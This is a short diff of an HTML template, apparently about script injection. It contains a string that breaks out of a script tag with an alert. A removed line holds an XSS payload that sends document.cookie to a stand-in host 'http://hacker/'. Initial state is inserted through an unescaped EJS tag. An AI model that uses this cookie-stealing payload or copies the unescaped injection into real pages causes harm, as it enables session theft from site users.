@@ -10,7 +10,7 @@
     <script>
   var s = "surprise!</script><script>alert('whoops!')</script>";
 </script>
-    "><SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>
+   
 <script>
   window.__INITIAL_STATE__ = <%- JSON.stringify(initialState) %>;
 </script>
